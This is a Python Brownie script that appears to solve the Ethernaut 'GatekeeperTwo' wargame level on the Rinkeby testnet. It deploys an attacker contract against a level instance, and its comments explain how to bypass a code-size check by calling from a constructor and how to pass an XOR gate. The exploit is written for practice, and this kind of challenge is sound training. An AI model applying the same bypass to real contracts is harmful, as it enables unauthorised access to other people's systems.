from brownie import accounts, GatekeeperTwo, GatekeeperTwoAttacker

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0xaB476fC5ef9146cE7a436F04EC1B5f8eF14e18A2"
gate_keeper = GatekeeperTwo.at(instance_address)

# --------------------------------------------------------------------------------------
# register as an entrant to pass this level
#
# we can bypass the second modifier if we call the enter function in the constructor of
# our hacker contract
# the modifier will check the code size of our contract, and since it is under construction
# it will return 0
#
# from the yellow paper, section 7: "Note that while the initialisation code
# is executing, the newly created address exists but with
# no intrinsic body"
#
# To pass GateThree: A xor B = C is the same as A xor C = B
# --------------------------------------------------------------------------------------


def level_completed():
    return gate_keeper.entrant() == account.address


def exploit():
    # deploy hacker contract
    hacker = GatekeeperTwoAttacker.deploy(instance_address, {"from": account})

    # view the entrant variable
    print(gate_keeper.entrant())

    # view contractHacked variable
    print(hacker.contractHacked())

    # confirm we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
